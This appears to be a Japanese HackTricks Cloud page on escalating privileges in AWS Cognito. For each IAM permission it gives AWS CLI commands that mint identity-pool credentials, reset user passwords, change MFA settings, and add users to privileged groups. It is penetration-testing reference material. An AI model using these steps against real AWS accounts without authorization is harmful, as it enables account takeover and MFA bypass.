# AWS - Cognito特権エスカレーション

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* もし、あなたの**会社をHackTricksで広告表示したい**場合や、**PEASSの最新バージョンをダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **ハッキングのトリックを共有するために、PRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに参加する**。

</details>

## Cognito

Cognitoについての詳細は以下を参照してください：

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Identity Poolから資格情報を収集する

Cognitoは、**認証済み**および**未認証のユーザー**の両方に**IAMロールの資格情報**を付与することができるため、アプリケーションの**Identity Pool ID**（アプリケーションにハードコードされているはず）を特定すると、新しい資格情報を取得し、それによって特権エスカレーションを行うことができます（おそらく以前は資格情報を持っていなかったAWSアカウント内）。

詳細については、[**このページ**](../aws-unauthenticated-enum-access/#cognito)を参照してください。

**潜在的な影響:** 未認証ユーザーに関連付けられたサービスロール（おそらく認証ユーザーに関連付けられたロールも）への直接的な特権エスカレーション。

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

この権限を持つことで、Cognitoアプリの認証済み/未認証ユーザーに対して**任意のCognitoロール**を付与することができます。
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
もしCognitoアプリが**未認証のユーザーを有効にしていない**場合、それを有効にするために`cognito-identity:UpdateIdentityPool`の権限も必要になるかもしれません。

**潜在的な影響:** 任意のCognitoロールへの直接特権昇格。

### `cognito-identity:update-identity-pool`

この権限を持つ攻撃者は、例えば自分が制御するCognitoユーザープールや他の任意のIDプロバイダーを設定することができます。そこで、そのユーザープロバイダーにログインすることで、**このCognito Identity Poolにアクセスする**ことができます。その後、単に**そのユーザープロバイダーにログインするだけで、Identity Poolで設定された認証済みロールにアクセスする**ことができます。
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
この権限を悪用して、基本認証を許可することも可能です。
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**潜在的な影響**: 設定された認証済みIAMロールを侵害する。

### `cognito-idp:AdminAddUserToGroup`

この権限は、CognitoユーザーをCognitoグループに追加することを許可します。したがって、攻撃者はこの権限を悪用して、自分の管理下にあるユーザーを他の権限が**より優れた**グループまたは**異なるIAMロール**に追加することができます。
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**潜在的な影響:** 他のCognitoグループとUser PoolグループにアタッチされたIAMロールへの特権昇格。

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

これらの権限を持つ攻撃者は、**侵害されたCognito Identity Providerが使用できるすべてのIAMロール**を持つ**グループを作成/更新**し、侵害されたユーザーをグループの一部として作成することができます。これにより、すべてのロールにアクセスできます。

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**潜在的な影響:** 他のCognito IAMロールへの特権昇格。

### `cognito-idp:AdminConfirmSignUp`

この権限は、**サインアップの確認**を許可します。デフォルトでは、誰でもCognitoアプリケーションにサインインできますが、これが残されている場合、ユーザーは任意のデータでアカウントを作成し、この権限で確認することができます。
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**潜在的な影響:** 新しいユーザーを登録できる場合、認証済みユーザーのアイデンティティプールIAMロールへの間接的な特権昇格が可能です。また、任意のアカウントを確認できるため、他のアプリの機能への間接的な特権昇格も可能です。

### `cognito-idp:AdminCreateUser`

この権限を持つ場合、攻撃者はユーザープール内に新しいユーザーを作成することができます。新しいユーザーは有効に作成されますが、パスワードを変更する必要があります。
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**潜在的な影響:** 認証済みユーザーのアイデンティティプールIAMロールへの直接の特権昇格。他のアプリの機能への間接的な特権昇格で、任意のユーザーを作成できるようになります。

### `cognito-idp:AdminEnableUser`

この権限は、攻撃者が無効化されたユーザーの資格情報を見つけ、それを再度有効にする必要がある非常に限られたケースで役立ちます。
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**潜在的な影響:** 認証済みユーザーのアイデンティティプールIAMロールへの間接的な特権昇格および無効化されたユーザーの資格情報を持つ攻撃者の場合、ユーザーの権限への特権昇格が可能です。

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

この権限は、[**ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**メソッド**を使用してログインすることを許可します。詳細については、リンクを参照してください。

### `cognito-idp:AdminSetUserPassword`

この権限により、攻撃者は**任意のユーザーのパスワードを変更**することができ、そのユーザーになりすますことができます（MFAが有効でない場合）。
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**潜在的な影響:** 直接的な特権昇格により、ユーザーごとにアクセス可能なすべてのグループと、Identity Poolに認証されたIAMロールへのアクセスが可能となります。

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: 攻撃者は、この権限を悪用して、自分が制御するモバイル電話をユーザーの**SMS MFA**として設定する可能性があります。
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference（ユーザーのMFA設定）:** 前のパーミッションと同様に、この権限を使用してユーザーのMFA設定を変更し、MFA保護をバイパスすることができます。
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: 前のものと同様に、この権限はユーザープールのMFA設定を変更するために使用され、MFA保護をバイパスすることができます。
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** ユーザープールを更新してMFAポリシーを変更することも可能です。[こちらのcliを確認してください](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html)。

**潜在的な影響:** 攻撃者が認証情報を知っているユーザーのMFA保護をバイパスすることができるため、間接的な特権昇格が可能です。

### `cognito-idp:AdminUpdateUserAttributes`

この権限を持つ攻撃者は、自分が制御するユーザーのメールアドレスや電話番号、その他の属性を変更して、基礎となるアプリケーションでより多くの特権を取得しようとすることができます。\
これにより、メールアドレスや電話番号を変更し、確認済みとして設定することができます。
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**潜在的な影響:** Cognito User Poolを使用した基礎アプリケーションでの間接的な特権昇格が可能であり、ユーザ属性に基づいて特権が与えられます。

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

この権限を持つ攻撃者は、既存のプールクライアントよりも**制限の少ない新しいユーザプールクライアントを作成**することができます。たとえば、新しいクライアントは、任意の種類の認証方法を許可し、秘密情報を持たず、トークンの失効を無効にし、トークンの有効期間を長くすることができます...

同じことは、**既存のクライアントを変更**する場合にも行うことができます。

[**コマンドライン**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html)（または[**更新コマンド**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)）では、すべてのオプションを確認できます。チェックしてみてください！
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**潜在的な影響:** ユーザープールによって使用されるIdentity Poolの認可ユーザーへの潜在的な間接的な特権昇格。セキュリティ対策を緩和する新しいクライアントを作成することで、攻撃者が作成したユーザーでログインすることが可能になります。

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

攻撃者はこの権限を悪用して、新しいユーザーを含むCSVをアップロードしてユーザーを作成することができます。
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
（新しいインポートジョブを作成する場合、iam passroleの許可も必要になるかもしれませんが、まだテストしていません）。

**潜在的な影響:** 認証済みユーザーのアイデンティティプールIAMロールへの直接の特権昇格。任意のユーザーを作成できるため、他のアプリの機能への間接的な特権昇格も可能です。

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

攻撃者は新しいアイデンティティプロバイダを作成し、そのプロバイダを介して**ログイン**することができるようになります。
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**潜在的な影響:** 認証済みユーザーのアイデンティティプールIAMロールへの直接の特権昇格。任意のユーザーを作成できるため、他のアプリの機能への間接的な特権昇格も可能です。

### cognito-sync:\* の分析

これは、Cognito Identity Poolsのロールにデフォルトで非常に一般的な権限です。ワイルドカードの権限は常に悪いものですが（特にAWSからの場合）、**攻撃者の観点からは与えられた権限はあまり有用ではありません**。

この権限により、Identity Poolsのユーザー情報とIdentity Pools内のIdentity IDを読み取ることができます（これは機密情報ではありません）。\
Identity IDには、セッションの情報（AWSでは「保存されたゲーム」と定義されています）である[**データセット**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API_Dataset.html)が割り当てられている場合があります。これには一部の機密情報が含まれている可能性がありますが、確率は非常に低いです。この情報にアクセスする方法については、[**列挙ページ**](../aws-services/aws-cognito-enum/)で確認できます。

攻撃者は、これらの権限を使用して、これらのデータセットの変更を公開するCognitoストリームに自分自身を登録したり、Cognitoイベントでトリガーされるラムダに登録したりすることもできます。これが使用されているのを見たことはありませんし、ここに機密情報があることを期待するわけではありませんが、不可能ではありません。

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もしもあなたの**会社をHackTricksで宣伝したい**場合や、**PEASSの最新バージョンにアクセスしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **ハッキングのトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
